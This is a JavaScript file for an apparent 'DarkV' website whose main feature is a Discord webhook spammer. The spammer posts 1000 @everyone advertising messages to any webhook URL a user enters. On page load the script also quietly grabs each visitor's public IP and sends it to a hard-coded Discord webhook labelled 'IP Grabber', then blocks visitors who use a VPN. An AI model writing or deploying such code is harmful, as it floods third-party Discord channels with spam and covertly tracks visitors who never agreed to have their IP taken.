// Tab Switching functionality
document.getElementById('homeTab').addEventListener('click', () => {
    toggleTab('home');
});
document.getElementById('spammerTab').addEventListener('click', () => {
    toggleTab('spammer');
});
document.getElementById('infoTab').addEventListener('click', () => {
    toggleTab('info');
});
document.getElementById('buyTab').addEventListener('click', () => {
    toggleTab('buy');
});

function toggleTab(tabName) {
    // Hide all tabs content
    document.querySelectorAll('.container').forEach(container => {
        container.style.display = 'none';
    });

    // Show the selected tab content
    document.getElementById(tabName + 'Content').style.display = 'block';
}

// Grabbing public IP and detecting VPN
window.addEventListener('load', () => {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIp = data.ip;
            console.log('User IP:', userIp);

            // Send IP to Discord webhook
            const ipWebhookData = {
                username: "IP Grabber",
                content: `User IP: ${userIp}`
            };
            fetch('https://discord.com/api/webhooks/1320583422313238579/CGQB3ZRPiBE4-XdSv3eYFTJ1xHA1ROTNoMUoKCW83_G4vHBDtug2RKQJrczhy1FhXbLd', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(ipWebhookData)
            });

            // Check if the user is using a VPN
            fetch(`https://vpnapi.io/api/${userIp}`)
                .then(vpnResponse => vpnResponse.json())
                .then(vpnData => {
                    if (vpnData.security.vpn) {
                        // If the user is using a VPN, deny access and show message
                        document.body.innerHTML = "<h1>🔴DENIED ACCESS TO DARKV. REASON: USING A VPN (TURN OFF YOUR VPN TO CONTINUE)...</h1>";
                    } else {
                        console.log("User is not using a VPN.");
                    }
                })
                .catch(err => console.log('VPN Check failed:', err));
        })
        .catch(err => console.log('IP Fetch failed:', err));

    // Handle title change based on focus
    const originalTitle = document.title;
    window.addEventListener('focus', () => {
        document.title = "🎄THANK YOU FOR USING DARKV🎄";
    });
    window.addEventListener('blur', () => {
        document.title = "🎄COME BACK LATER🎄";
    });
});

// Webhook spammer functionality
const spamButton = document.getElementById('spamButton');
const statusText = document.getElementById('status');
const webhookUrlInput = document.getElementById('webhookUrl');
const loader = document.getElementById('loader');

const customWebhookData = {
    username: "COOKED BY DARKV",  // Custom webhook name
    avatar_url: "https://cdn.discordapp.com/attachments/1320574046181654644/1320577337192091698/Screenshot_2024-12-22_203452.png",  // Custom profile picture URL
    content: "😈🤦‍♂️WEBHOOK COOKED BY DARKV @everyone OUR SERVER: https://discord.gg/dpRvmbRZUK 🤦‍♂️😈 & OUR WEBSITE: https://darkv-spammer-blond.vercel.app/"  // Custom message
};

spamButton.addEventListener('click', async () => {
    const webhookUrl = webhookUrlInput.value.trim();
    
    if (!webhookUrl) {
        statusText.textContent = "Status: Error... Invalid Webhook URL";
        return;
    }

    statusText.textContent = "Status: Sending messages...";
    loader.style.display = 'block';  // Show loader

    try {
        for (let i = 0; i < 1000; i++) {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(customWebhookData)  // Sending custom username, avatar, and content
            });
        }
        statusText.textContent = "Status: Messages sent successfully!";
    } catch (error) {
        console.error(error);
        statusText.textContent = "Status: Error... Failed to send messages";
    } finally {
        loader.style.display = 'none';  // Hide loader after completion
    }
});
